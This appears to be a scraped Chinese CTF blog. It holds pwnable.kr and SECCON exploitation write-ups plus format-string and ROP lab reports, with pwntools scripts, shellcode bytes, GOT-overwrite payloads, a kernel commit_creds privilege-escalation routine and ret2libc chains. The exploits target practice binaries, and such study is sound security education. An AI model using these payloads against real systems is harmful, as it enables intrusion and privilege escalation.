import *payload &#x3D; &quot;\\x90&quot; * 8000 + shellcraft.sh()&#39;&#39;&#39;for some reason,this wp isn&#39;t complete.You need to complete this part.&#39;&#39;&#39; fsbEz Format String 1Have you ever saw an example of utilizing [n] format character?? :( 存在跳板指针的分析如下 栈上有指向环境变量地址和argv的指针，而环境变量和参数已经被置空所以存在这两个跳板指针。 思路1 覆写printf的Got表(0x804a004)为execve地址(0x80486ab)即可 1234.&#x2F;fsb &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1%134520836c%14$n%134514347c%20$n 思路2 修改key值为0 123456789101112131415161718192021222324from pwn import *context.arch = &#x27;i386&#x27;fmt1 = &#x27;%&#x27; + str(0x0804A060) + &#x27;&#x27;fmt2 = &#x27;%&#x27; + str(0x0804A064) + &#x27;&#x27;write1 =write2 = &#x27;&#x27;&#x27;for some reason,this wp isn&#x27;t complete.You need to complete this part.&#x27;&#x27;&#x27;p = process(&#x27;/home/fsb/fsb&#x27;)p.recvuntil(&#x27;)\\n&#x27;)p.sendline(fmt1)p.recvuntil(&#x27;)\\n&#x27;)p.sendline(write1)p.recvuntil(&#x27;)\\n&#x27;)p.sendline(fmt2)p.recvuntil(&#x27;)\\n&#x27;)p.sendline(write2)p.recvuntil(&#x27;key : \\n&#x27;)p.sendline(&#x27;0&#x27;)p.interactive() dragonEz 整数溢出+UAF 123456789101112131415161718192021222324252627282930from pwn import *context.arch = &#x27;i386&#x27;context.log_level = &#x27;debug&#x27;#p = process(&#x27;./dragon&#x27;)p = remote(&#x27;pwnable.kr&#x27;, 9004)p.recvuntil(&#x27;Knight\\n&#x27;)p.sendline(&#x27;1&#x27;)for i in xrange(2): p.recvuntil(&#x27;Invincible.\\n&#x27;) p.sendline(&#x27;1&#x27;)p.recvuntil(&#x27;Knight\\n&#x27;)p.sendline(&#x27;1&#x27;)for i in xrange(4): p.recvuntil(&#x27;Invincible.\\n&#x27;) p.sendline(&#x27;3&#x27;) p.recvuntil(&#x27;Invincible.\\n&#x27;) p.sendline(&#x27;3&#x27;) p.recvuntil(&#x27;Invincible.\\n&#x27;) p.sendline(&#x27;2&#x27;)p.recvuntil(&#x27;As:\\n&#x27;)&#x27;&#x27;&#x27;for some reason,this wp isn&#x27;t complete.You need to complete this part.&#x27;&#x27;&#x27;p.interactive() fix很巧妙的栈帧结构分析，由于esp靠近shellcode，在正常执行shellcode的过程中堆栈操作修改了放有shellcode的数组。 将push eax 改为leave即可，但是会造成execve函数执行时参数压栈有问题，传入的参数不是 /bin/sh 可以通过创建对应文件，将sh填入文件即可 1234567891011121314from pwn import *context.log_level=&#x27;debug&#x27;a=process(&quot;/home/fix/fix&quot;)a.recv()a.sendline(&#x27;15&#x27;)a.sendline(&#x27;201&#x27;)a.recvuntil(&quot;get shell\\n&quot;)error=a.recvline()#print(error)&#x27;&#x27;&#x27;for some reason,this wp isn&#x27;t complete.You need to complete this part.&#x27;&#x27;&#x27; syscall由于内核系统调用未限制可访问的内存地址引起的内核漏洞，利用思路： 方法一手撸汇编，汇编出commit_creds(prepare_kernel_cred(0)) 的不包含小写字母的汇编代码 1234567891011121314.data:00000008 b501 push &#123;r0, lr&#125; .data:0000000a 1a92 subs r2, r2, r2 .data:0000000c 1c10 adds r0, r2, #0 .data:0000000e 46f0 mov r8, lr .data:00000010 4a02 ldr r2, [pc, #8] ; (0x0000001c) ;char c &#x3D; src[i].data:00000012 4790 blx r2 .data:00000014 4a02 ldr r2, [pc, #8] ; (0x00000020) ;dst[i] &#x3D; c.data:00000016 321c adds r2, #28 .data:00000018 4790 blx r2 ;i++.data:0000001a bd01 pop &#123;r0, pc&#125; .data:0000001c 8003f924 #cat &#x2F;proc&#x2F;kallsyms|grep commit_creds.data:00000020 8003f550 #cat &#x2F;proc&#x2F;kallsyms|grep prepare_kernel 得到对应的字节码 123char grant_privs[] = &quot;\\x01\\x60\\x8f\\xe2\\x16\\xff\\x2f\\xe1\\x01\\xb5\\x92\\x1a&quot; &quot;\\x10\\x1c\\xf0\\x46\\x02\\x4a\\x90\\x47\\x02\\x4a\\x1c\\x32&quot; &quot;\\x90\\x47\\x01\\xbd\\x24\\xf9\\x03\\x80\\x50\\xf5\\x03\\x80&quot;; 12345678 #/proc $ cat /usr/include/arm-linux-gnueabihf/asm/unistd.h |grep 343#define __NR_vmsplice (__NR_SYSCALL_BASE+343) void * sys_vmsplice = (void *)0x800e3dc8;#343系统调用对应的函数SyS_vmsplice syscall(223, grant_privs, sys_vmsplice); syscall(343);... code to cat falg 方法二 修改SYS_CALL_TABLE由于最终要执行commit_creds(prepare_kernel_cred(0));函数 我们可以修改两个系统调用表分别指向commit_creds 函数和prepare_kernel_cred函数 查找系统调用表后，选取系统调用号未stime() 系统调用号为 time()进行替换(ps:选取这两个系统调用是因为这两个系统调用参数刚好都是一个) 这样调用syscall(25(syscall(13,0))就相当于调用了commit_creds(prepare_kernel_cred(0)); 方法三 自设syscall Prepare a syscall routine sys_getroot 实现commit_creds(prepare_kernel_cred(0));功能 Overwrite sys_upper at &amp;SYS_CALL_TABLE[SYS_upper] to sys_getroot with syscall SYS_upper 修改SYS_CALL_TABLE Call SYS_upper again with addresses of prepare_kernel_cred and commit_creds. 调用SYS_upper crypton1非常有意思的密码题 用户输入 ID + PW 服务器返回采用CBC模式加密的AES(ID_PW_cookie)加密hexdigest结果 ，PW=sha256(ID+COOKIE).hexdigest 用户得到root的PW即可顺利getshell，思路非常清晰关键就是如何获取COOKIE。 AES的CBC模式以16字节(128bit)为一组进行加密 echo1存在固定的某个可写入内容的地址id，写入Jmp rsp Ez ROP Jmp rsp echo2 23字节的一个shellcode fsb泄露栈地址 UAF : 选4会free掉指向函数的指针0x28，选3会申请并释放一个大小为0x20的指针。如果我们free指针o，3中会申请到刚free的函数指针o，覆写第四个函数指针指向23字节的shellcode，这样退出的时候就执行了shellcode 1shellcode &#x3D; &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;# 23 bytes 123456789101112131415161718192021222324from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;info&#x27;)r = remote(&#x27;pwnable.kr&#x27;,9011) shellcode = &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;# 23 bytesr.recvuntil(&#x27; : &#x27;)r.sendline(shellcode)r.recvuntil(&#x27;&gt; &#x27;)r.sendline(&#x27;2&#x27;)r.recvuntil(&#x27;\\n&#x27;)#获取ebprbp_addr = int(r.recv(16),16)#print(hex(rbp_addr))&#x27;&#x27;&#x27;for some reason,this wp isn&#x27;t complete.You need to complete this part.&#x27;&#x27;&#x27;r.recvuntil(&#x27;(y/n)&#x27;)#UAF rsa_calculator基本思路 RSA set key过程中参数校验有问题，应该为||不符合一个就报错 fsb 泄露canary 输入%p.%p.%p.%p.%p.%p.%p.%p测栈顶在第几个参数 可以看到rsi为第一个参数,栈顶为第6个参数，结合ebp地址我们可以计算出 ebp是第(6+(0x7fffffffdfa0-0x7fffffffd960)/8)=206个参数，那么canary就是205个参数这样就泄露出canary decrypt()过程存在溢出 pri_addr = 0x602960 g_pbuf= 0x602560 无界复制可导致g_pbuf溢出覆盖pri_addr noteEZ stack spray: spray the stack with your shellcode address Tips: 菜单循环用的是递归，每次调用函数栈帧大小是固定的0x430 hex(0xffffc8b0-0xffffcce0)=-0x430 mmap_s函数增加了类似于ASLR的功能返回一个随机的地址，但是看源码得到:用于存储note的page分配的是RWX页权限，猜测这个页面是可以放shellcode的部分，然后利用程序漏洞跳转到该shellcode 123456789101112131415161718192021222324252627282930ptr = mmap_s((void*)NULL, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);void* mmap_s(void* addr, size_t length, int prot, int flags, int fd, off_t offset)&#123; // security fix: current version of mmap(NULL.. is not giving secure random address if(addr == NULL &amp;&amp; !(flags &amp; MAP_FIXED) )&#123; void* tmp=0; int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1) exit(-1); if(read(fd, &amp;addr, 4)!=4) exit(-1); close(fd); // to avoid heap fragmentation, lets skip malloc area addr = (void*)( ((int)addr &amp; 0xFFFFF000) | 0x80000000 ); while(1)&#123; // linearly search empty page (maybe this can be improved) tmp = mmap(addr, length, prot, flags | MAP_FIXED, fd, offset); if(tmp != MAP_FAILED)&#123; return tmp; &#125; else&#123; // memory already in use! addr = (void*)((int)addr + PAGE_SIZE); // choose adjacent page &#125; &#125; &#125; man mmap查一下各个参数发现MAP_FIXED存在问题 Stackoverflow这篇已经讲的非常清楚。 很精髓的一句话： I think using “MAP_FIXED” is one of those things where “here, have this gun, but please be careful you don’t shoot yourself in the foot”. In other words, “it’s your task to ensure you use it correctly”. 源程序使用这个参数的目的是为了防止由于页面置换导致的mmap失败，但其实如果addr所在的页面存在，新的页面会替换掉原来的页面，这就导致了我们可以实现任意地址写(但是随机的) 可以利用页面替换将栈上数据填满shellcode addr这样return的时候会返回到可执行的shellcode页面 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *#context.log_level = logging.DEBUGe = ELF(&#x27;./note&#x27;)p = process(e.path)p = remote(&quot;127.0.0.1&quot;,9001)context.arch = e.archselect_cnt = 0 #regard stack frame layeresp_start = ******* #This may be different in different os,but it does matters,read the code and you know why.offset = 0x*** #This is certain.Check it out with you GDB.def create(): global select_cnt # in order to modify the variable select_cnt += 1 p.sendlineafter(&#x27;5. exit\\n&#x27;, &#x27;1&#x27;) p.recvuntil(&#x27;note created. no &#x27;) no = int(p.recvuntil(&#x27;\\n&#x27;).strip(b&#x27;\\n&#x27;), 10) p.recvuntil(&#x27;[&#x27;) ptr = int(p.recvuntil(&#x27;]&#x27;).strip(b&#x27;]&#x27;), 0x10) return (no, ptr)def delete(no): global select_cnt # in order to modify the variable select_cnt += 1 p.sendlineafter(&#x27;5. exit\\n&#x27;, &#x27;4&#x27;) p.sendlineafter(&#x27;note no?\\n&#x27;, str(no))def write(no, content): global select_cnt # in order to modify the variable select_cnt += 1 p.sendlineafter(&#x27;5. exit\\n&#x27;, &#x27;2&#x27;) p.sendlineafter(&#x27;note no?\\n&#x27;, str(no)) p.sendlineafter(&#x27;(MAX : 4096 byte)&#x27;, content)def bye(): p.sendlineafter(&#x27;5. exit\\n&#x27;, &#x27;5&#x27;)addr = 0&#x27;&#x27;&#x27;for some reason,this wp isn&#x27;t complete.You need to complete this part.&#x27;&#x27;&#x27;#write your shellcode address here.bye()p.interactive()#This exp is instability for the reason that some important page may be overlapped.If it doest work,try it again :) alloca.ccontral esp,control eip,control the world. 12vuln: alllca use this code to rewrite esp,then control eip, get shell. 自己想wp的时候，把重点放在了这里$memcpy(buffer+size, \\&amp;g_canary, 4);$但是分析后发现g_canary被写入了栈上某个固定的地址。 12345678910111213141516171819.text:08048745 mov eax, ds:size ; alloca here.text:0804874A add eax, 4 ;eax&#x3D;size+4.text:0804874D lea edx, [eax+0Fh] ;edx&#x3D;size+4+0xf.text:08048750 mov eax, 10h .text:08048755 sub eax, 1 ;eax&#x3D;0xf.text:08048758 add eax, edx ;eax&#x3D;size+4+0xf+0xf.text:0804875A mov ecx, 10h ; 除数.text:0804875F mov edx, 0 ;被除数高位,低位为eax.text:08048764 div ecx ;eax为商,edx为余数 &#x2F;&#x2F;等价于eax&#x3D;eax&#x2F;0x10.text:08048766 imul eax, 10h;eax&#x3D;eax*0x10 &#x2F;&#x2F;结合上条功能为栈对齐.text:08048769 sub esp, eax &#x2F;&#x2F;由于esp&#x3D;esp-eax 上条为栈向上对齐(注意区分esp&amp;0xfff0这个为向下对齐).text:0804876B mov eax, esp.text:0804876D add eax, 0Fh ;由于栈已对齐junk code.text:08048770 shr eax, 4 ;同上.text:08048773 shl eax, 4 ;同上.text:08048776 mov ds:buffer, eax;buffer&#x3D;esp-size-34memcpy时,g_canary被放到esp-size-34+size&#x3D;esp-34的地址，无法改变main函数栈帧 查看check_canary函数还有canary压栈的操作，汇编分析计算偏移即可 同类型练手 Seccon CTF quals 2016 loveletter 程序基本流程:读入用户输入，参数过滤后将敏感字节转换为♥(三字节b’\\xe2\\x99\\xa5)，然后输出，但是最后调用的是字符串拼接echo $str 放入system参数。参数过滤会导致buf溢出，进而修改关键变量实现shell basic exp just get flag 因为过滤了’/‘所以可以直接通过溢出调system(“cat flag”) 1234567891011121314from pwn import *e = ELF(&quot;./loveletter&quot;)p = process(e.path)&#x27;&#x27;&#x27;for some reason,this wp isn&#x27;t complete.You need to complete this part.&#x27;&#x27;&#x27;p.sendline(payload)p.interactive() pro exp 12345678910111213from pwn import *e = ELF(&quot;./loveletter&quot;)p = process(e.path)&#x27;&#x27;&#x27;for some reason,this wp isn&#x27;t complete.You need to complete this part.&#x27;&#x27;&#x27;p.sendline(payload)p.interactive() explanation about system(“env sh -c sh junkstring”). 12345678910111213If env is run without any options, it prints the variables of the current environment. Otherwise, env sets each NAME to VALUE and executes COMMAND.Demo:#!&#x2F;usr&#x2F;bin&#x2F;env command#!&#x2F;usr&#x2F;bin&#x2F;env -[v]S[option]… [name&#x3D;value]… command [args]…env sh -c &#39;exec &quot;$@&quot;&#39; sh prog&#x3D; true # also runs &#39;prog&#x3D;&#39;explanation:env sh &#x3D; -c sh &#x2F;&#x2F; junkstring this part is regarded as argv of command. 读一下env源码和man page 撒花完结","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"Format String Analysis Report","slug":"FormatString","date":"2021-09-17T17:24:39.000Z","updated":"2022-03-25T16:58:02.000Z","comments":true,"path":"2021/09/18/FormatString/","link":"","permalink":"http://example.com/2021/09/18/FormatString/","excerpt":"","text":"Format String Analysis Report1.Experiment requirement 掌握格式化字符串漏洞基本原理，并能够利用该漏洞 2.Experiment Target 对format1进行详细分析，编写python脚本，并拿到shell权限 编写完成详细的实验分析报告，对python脚本和利用过程进行详细分析。 3.Experiment process and analysisShell脚本和GetShell权限结果截图123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *def generate_format(addr, value): payload = b&#x27;&#x27; print_count = 0 addr_part = b&#x27;&#x27; for i in range(8): if (value &gt;&gt; (8*i)) == 0: break one_byte = (value &gt;&gt; (8*i)) &amp; 0xff temp = &#x27;%&#123;0&#125;c%&#123;1&#125;$hhn&#x27;.format((one_byte - print_count) % 0x100, 19 + i) payload+=temp.encode() print_count += (one_byte - print_count) % 0x100 addr_part += p32(addr + i) payload = payload.ljust(48, b&#x27;a&#x27;) payload += addr_part return payloadp=process(&quot;./format1&quot;)e=ELF(&quot;./format1&quot;)so=ELF(&quot;./libc.so.6&quot;)main_addr=0x08048648exit_got=e.got[&#x27;exit&#x27;]puts_got=e.got[&#x27;puts&#x27;]printf_got=e.got[&#x27;printf&#x27;]offset=so.symbols[&#x27;system&#x27;]-so.symbols[&#x27;puts&#x27;]#print(type(exit_got))payload_1=generate_format(exit_got,main_addr)p.recvuntil(&quot;Welcome~\\n&quot;)p.sendline(payload_1)payload_2=b&#x27;%8$s&#x27;+p32(puts_got)p.recvuntil(&quot;Welcome~\\n&quot;)p.sendline(payload_2)puts_addr=u32(p.recv(4))sys_addr=puts_addr+offsetpayload_3=generate_format(printf_got,sys_addr)p.recvuntil(&quot;Welcome~\\n&quot;)p.sendline(payload_3)p.recvuntil(&quot;Welcome~\\n&quot;)p.sendline(&quot;/bin/sh&quot;)p.interactive() 整体流程分析 将exit函数的GOT表地址覆写为main函数的地址，程序每次退出时将再返回到main函数 通过printf格式化字符串漏洞，获取puts函数地址，再通过libc的相对地址偏移获取system的地址 用格式化字符串漏洞，将system函数地址覆盖GOT表中printf函数的地址，在buf 中写入/bin/sh，当执行printf(buf)时，相当于执行system(&#39;/bin/sh&#39;) 覆盖exit函数的GOT表为main函数地址123payload_1=generate_format(exit_got,main_addr)p.recvuntil(&quot;Welcome~\\n&quot;)p.sendline(payload_1) 首先查看开启的保护 该可执行文件开启了栈保护，因此排除ROP溢出覆盖返回地址的思路，有printf函数，考虑格式化字符串问题。 generate_format(exit_got,main_addr)函数分析12345678910111213141516def generate_format(addr, value): payload = b&#x27;&#x27; print_count = 0 addr_part = b&#x27;&#x27; for i in range(8)://为了遍历整个value,使得value全部写入 if (value &gt;&gt; (8*i)) == 0://位操作，依次右移8位，使得每次循环处理并写入一个字节 break //value全部写入后结束循环 one_byte = (value &gt;&gt; (8*i)) &amp; 0xff//提取出value没有写入的部分位中的后两位(即低位字节) temp = &#x27;%&#123;0&#125;c%&#123;1&#125;$hhn&#x27;.format((one_byte - print_count) % 0x100, 19 + i) //&#x27;&#123;0&#125;c%&#123;1&#125;$hhn&#x27;是向地址单元&#123;1&#125;写入字节数据&#123;0&#125;+之前已打印的字符,mod 0x100是因为一字节数据最大就为0xff,one_byte-print_count是考虑了之前打印的字符个数,关于写入地址后面通过gdb给出具体分析 payload+=temp.encode() print_count += (one_byte - print_count) % 0x100 addr_part += p32(addr + i) //最后写入需要写入的地址 payload = payload.ljust(48, b&#x27;a&#x27;)//填充，因为是32位程序，所以栈上数据会以4bite对齐,由于累计循环写了四次,payload每次循环写入的内容不超过48字节,取向上对齐48字节 payload += addr_part return payload gdb调试确定写入地址先确认buf数组在栈上的偏移 buf地址为0x0xffffd12c，相对于栈顶(0xffffd12c-0xffffd110)=0x1c=74，即buf位于格式化字符串中的第7个参数,加上填充的48bytes的内容=4\\12，因此第一个写入地址位于格式化字符串中的第7+12=19个参数，此后地址单元num依次为20，21，22，最终payload如下： 通过Puts函数泄露system地址&amp;payload_2的构造puts函数和system函数都是libc动态链接库的基本函数，相对地址偏移是确定的，确定puts函数实际运行地址后，可以根据so库中的相对地址偏移计算出实际运行时system函数地址 1234payload_2=b&#x27;%8$s&#x27;+p32(puts_got)p.recvuntil(&quot;Welcome~\\n&quot;)p.sendline(payload_2)puts_addr=u32(p.recv(4)) payload_2通过%n$s打印puts函数地址，其中n通过之前分析的buf首地址相当于format的第七个参数,刚好对应%n$s四个字节，后面跟着的p32(puts_got)就对应第八个format参数，这样打印出来前四个字节就是puts_got地址。 通过修改printf函数GOT表为system实现GetShell12345678exit_got=e.got[&#x27;exit&#x27;]puts_got=e.got[&#x27;puts&#x27;]printf_got=e.got[&#x27;printf&#x27;]offset=so.symbols[&#x27;system&#x27;]-so.symbols[&#x27;puts&#x27;]sys_addr=puts_addr+offsetpayload_3=generate_format(printf_got,sys_addr)p.recvuntil(&quot;Welcome~\\n&quot;)p.sendline(payload_3) 通过相对偏移计算出system实际地址，再通过generateformat函数实现printf函数got表的替换，这样当调用print函数的时候实际上是调用了system函数，同时printf函数的参数存储再buf中,也恰好是一个参数入栈，那么我们通过标准输入”/bin/sh”就实现了”/bin/sh”压栈并调用system函数的过程，最终成功getshell，不过这个shell有个小瑕疵就是exit的时候会返回一个”Welcome~”。 4.Summary​ 通过本次实验,先调试了fs_read、fs_write函数，对格式化字符串泄露栈上数据和任意地址写入非法数据有了更深刻的认识，通过实际手动调试分析format1，掌握应对开启canary保护的可执行文件的pwn思路，此类型题目特征较为明显，有类printf函数的不正确使用、开启金丝雀保护，一般来说都能通过格式化字符串漏洞getshell。","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"FormatString","slug":"FormatString","permalink":"http://example.com/tags/FormatString/"}]},{"title":"Return Oriented Programming Report","slug":"EzRop","date":"2021-09-10T17:24:39.000Z","updated":"2022-03-25T13:53:38.000Z","comments":true,"path":"2021/09/11/EzRop/","link":"","permalink":"http://example.com/2021/09/11/EzRop/","excerpt":"","text":"Return Oriented Programming Report1.Experiment requirements 针对实验一，通过gdb调试rop1确定Shellcode的地址；此外通过rop1.py的调试脚本确定shellcode的地址；最终拿到shell权限。相关详细分析过程写入报告，并比较两种方法的特点。 针对实验二的32位环境和64位环境，通过调试分析，完成实际rop2.py和rop3.py(填补空白并修改错误)，最终拿到shell权限。相关详细分析写入报告。 2.Expriment Target 工具方面：掌握gdb、pwntools等工具的使用。 理解并掌握基本的ROP技能，能够编写pwntools脚本。 ==分析pwntools在ROP方面实现的原理== 3.Experimental process and analysis3.0 Environment Settings编译生成rop1，并关闭ASLR 3.1 gdb调试rop1在vuln处设断点： 观察到buf数组的首地址为[ebp-0x88]，以此地址为依据进行rop1.py获取真实地址 3.2 rop1.py分析写入一个错误的返回地址得到core转储文件1234567891011from pwn import *p = process(&#x27;rop1&#x27;)#gdb.attach(p,&#x27;b vuln&#x27;)#shellcode = asm(shellcraft.sh())shellcode=b&#x27;jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80&#x27;shellcode_addr = 0xdeadbeefpayload = shellcode.ljust(0x8c,b&#x27;a&#x27;)+p32(shellcode_addr)p.sendline(payload)p.interactive() gdb分析转储文件程序由于访问了一段不可访问的内存而导致崩溃，此时ESP指针应该指向返回地址的下一地址 计算此时ESP相对buf首地址偏移为：0x4(返回地址)+0x8c(buff数组+ebp)=0x90 所以buf起始地址为ESP-0x90,写入py脚本 1shellcode_addr&#x3D;0xffffd1e0 成功GetShell 关于GDB调试的分析gdb主要功能的实现依赖于一个系统函数ptrace，通过man手册可以了解到，ptrace可以让父进程观察和控制其子进程的检查、执行，改变其寄存器和内存的内容，主要应用于打断点（也是gdb的主要功能）和打印系统调用轨迹。 ptrace函数原型如下 1234#include &lt;sys/ptrace.h&gt;long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); gbd调试ptrace基本流程 gdb调试一个新进程：通过fork函数创建一个新进程，在子进程中执行ptrace(PTRACE_TRACEME, 0, 0, 0)函数，然后通过execv()调用准备调试的程序。 attach到已运行进程：将pid传递给gdb，然后执行ptrace(PTRACE_ATTACH, pid, 0, 0)。 在使用参数为PTRACE_TRACEME或PTRACE_ATTACH的ptrace系统调用建立调试关系之后，交付给目标程序的任何信号（除SIGKILL之外）都将被gdb先行截获，gdb因此有机会对信号进行相应处理，并根据信号的属性决定在继续目标程序运行时是否将之前截获的信号实际交付给目标程序。 ==关于gdb调试中看到的buf数组首地址和调试core转储文件不一致的解释==基于gdb调试原理，可以得知gdb的调试会影响buf’在内存的位置，调试时gdb fork出子线程执行rop1，rop1环境变量继承自gdb，堆栈发生偏移，buf地址偏移。 core dump 是进程终止运行时进程地址空间内容和进程有关状态的信息的保存，是实际运行时的数据，此buf地址是真实运行的地址。 ==不通过Pwntools工具，手动GetShell==在分析完毕GDB由于自己的环境变量会改变buff运行时地址后， 下面通过仅用GDB调试实现getShell过程。 1.首先要解决如何获取二进制shellcode用pwntools中的生成shellcode模块生成，但是得到的数据不是bytes类型的要进行转换 方法1 将pwntools生成的shellcode数据直接用write()函数通过’ab+’的方式以二进制写入文件 方法2 利用python -m ‘print(b”shellcode”)’输入对应的shellcode到文件，此处踩坑点：必须写入二进制文件，因为python3对字节数据和字符串数据做了严格区分。(由于此处踩坑导致输入shellcode有问题导致后续有大量时间在debug)简单记录下debug过程，通过010edit定位write写入的shellcode和python 方法写入的shellcode区别。 注：justwrite是用write方法二进制写入 justpython是通过上述python方法写入。 方法3 利用 echo -e -n “\\x11\\x22” &gt; shellcode -e转义反斜杠 -n不添加行尾行标识符 通过以上任意一种方法最后均可得到二进制存储的shellcode 2.将二进制shellcode作为标准输入传入read()函数read(0,buf,128)函数0表示从标准输入中读取，此处不难想到可以通过linux的pipe管道机制作为标准输入传递buf给./rop1函数 上述命令含义：将bin_with_gdb(shellcode)作为标准输入并执行，可以看到成功写入 3.修改覆盖的返回地址为0xdeadbeef然后确定shellcode首地址(同gdb dump过程)此处和gdb core过程重复不做展开，最终可以得到正确的buf’地址，理论上执行就可getshell(❌) 4.无法调出shellcode分析Debug修改正确buf地址后然后生成相应的shellcode再转为二进制文件，再通过管道传入，但是gdb执行却报错。结果如下： 首先可以确定的是成功调出了 shell ，此处是 bin/dash ，查看发现 sh:symbolic link to dash 就是说 bin/sh被成功执行但是重定向到了dash，此时可以确定system函数成功执行 分析具体报错信息 信息1： /bin/dash: 1: jhh///sh/bin��h\u0001\u0001\u0001\u0001�4\u0001\u00011�Qj\u0004Y\u0001�Q��1�j 再r的话就一致重复这个报错回显。 此处省略冗长试错和查资料分析直接给出原因。 在gdb r &lt; args执行的时候，此过程将args作为标准输入，然后将shellcode输入到read函数,此过程顺利执行，成功调出dash，问题在于如果不修改args值，后续所有涉及标准输入的过程 gdb都默认将args的内容作为标准输入，所以这也解释了为什么会有/bin/dash: + shellcode的回显，也可以解释为什么进程会一直卡在这里(是因为调起的system函数一直在重复执行 /bin/dash + shellcode)的过程。 解决方法：在输入完shellcode后置空标准输入，此时system参数将从键盘读取得到交互界面。 分析（pwntools中的 p.interactive()这个过程其实就是修改标准输入到键盘） ==不通过Pwntools，也不通过GDB进行ROP的尝试==提出问题==一个问题==：上述gdb调试过程中得到的buf首地址是 ./rop1 过程中buf的首地址吗？ 答案是：不是 ==验证说明==：利用gdb调试出的shellcode 执行 ./rop1 &lt; shellcode 发现段异常（其实就是存在非法的返回地址或者栈帧结构有问题） ==理论解释==:(Thanks to Stackoverflow😊)此处将对GDB影响buf地址进行具体解释，关键在于env的改变，会影响buf首地址的偏移。 Environment variables are stored together with command line arguments at the top of the process memory layout, above the stack. Demo验证12345678910111213#include &lt;stdio.h&gt;int main(int argc, char *argv[], char *envp[]) &#123; int *rsp; printf(&quot;env: %p\\narg: %p\\nrsp: %p\\n&quot;, envp, argv, &amp;rsp); while (*envp != NULL) &#123; printf(&quot;%s\\n&quot;, *envp); ++envp; &#125; return 0;&#125; 正常执行： GDB调试执行： 对比即可发现rsp位置发生了偏移，这是由于gdb调试的时候先执行本身main函数，然后fork出子进程执行 被调试的函数，子进程的环境变量是继承自gdb的main函数，这就导致了环境变量的不同，继而导致buf偏移量不同 尝试能找到./rop1执行时buf数组位置并getshell.gdb调试时候执行rop1环境变量继承自gdb，pwntools执行rop1的时候环境变量继承自执行python程序，那么能否得到正常 ./rop1执行的buf首地址并执行shellcode呢。理论上可以。 首先依旧先写0xdeadbeef作为返回地址的shellcode并生成二进制文件 不做展开 由于 并不会生成core文件，这里利用dmesg查看segment fault信息（因为没有生成core文件无法gdb调试） ps:dmesg存储所有dump信息 得到esp信息，减去0x90算出shellcode首地址，修改shellcode并生成二进制文件 理论上，是可以完美通过 ./rop1 &lt; bin_without_gdb执行shellcode，但是却什么也没有发生！！！ 可以确定的是shellcode没问题，不然执行会报错，还可以确定的是控制流是跳转到了shellcode,因为没有让输入信息的过程，也没有hello rop回显。 分析 依旧是标准输入的原因，bin_without_gdb作为标准输入通过管道传递给rop1，然后正常执行shellcode调用system函数执行bin/sh，但是问题在于调用bin/sh没有正确的用户参数传入所以此线程直接跳过然后结束线程，也不返回main函数，也就不执行print(“hello rop”) 解决办法 在执行到 bin/sh线程时更改标准输入，然后通过键盘传入命令即可，其实这也就是gdb调试和pwntools做的过程。。 方法总结：gdb手动执行shellcode的过程能加强对环境变量、gdb调试能力、管道传递参数、标准输入的理解。 通过pwntools执行ROP方便快捷，不需要知道底层实现原理，只需要理解栈溢出内容即可，不需要考虑具体环境变量、管道重定向、标准输入流的问题，是封装好的便捷工具。 总之，pwntools就是我们gdb调试过程的一个封装，了解其底层实现原理是学习的目的，实际ROP时还是选用pwntools更方便快捷。 3.3 rop2.py(32-bit)分析环境准备 开启No-eXecute 数据所在页不可执行保护 验证 确定sys地址 找到libc.so库中system参数(“/bin/sh”)地址 找到system参数/bin/sh地址为0xf7f650af payload = b’a’*0x8c + p32(sys_addr)+p32(0xdeadbeef)+p32(binsh_addr) GetShell 3.4 rop3.py(64-bit)分析环境准备&amp;工具安装 寻找可用gadget 确定相对libc偏移为0x215bf，计算得指令地址为：0x7ffff7a035bf 查看sys_addr sys_addr=0x7ffff7a31550 查看”/bin/sh”地址 binsh_addr=0x7ffff7b95e1a 修改pwn脚本并执行需要注意的是64位情况下,offeset发生了变化=0x80(数组偏移)+0x8(ebp填充) 当我们所有工作都做完之后发现并不能正常GetShell。。 ==RSP 16bytes Alig and wirte our own code== Step 1 : 起初是以为是offset 或者system地址什么的算错了，再重复N次都计算得到同一结果时，排除此问题。 Step 2: Search On Google 初步确定问题为 64位程序在call函数前要求RSP16 bytes对齐，带入本题具体情境：利用gadget获取rdi并将system函数调用参数”/bin/sh”入栈,然后执行system函数，问题出在call system时rsp不是16的倍数。 Step 3: 问题溯源 下载本函数使用的库函数，定位system函数调用前操作，使用IDA静态调试 关键处Movaps指令 1234movaps XMM,XMM&#x2F;m128 movaps XMM&#x2F;m128,XMM把源存储器内容值送入目的寄存器,当有m128时, 内存地址必须是16字节对齐的。XMMWORD旨在表示与m128相同的类型,刚好这里符合第二条。 问题已经十分清晰，下面我们用GDB实际调试以下确认是否确实是由RSP没对齐导致的System不能执行。 Step 3: gdb问题验证 调试转储文件core确认确实是rsp未对齐所致 Step 4: Sove RSP Align Problems 起初没有多想以为单纯增加payload长度(即 末尾增加8个b’a’)，修改后却发现依旧报错！ 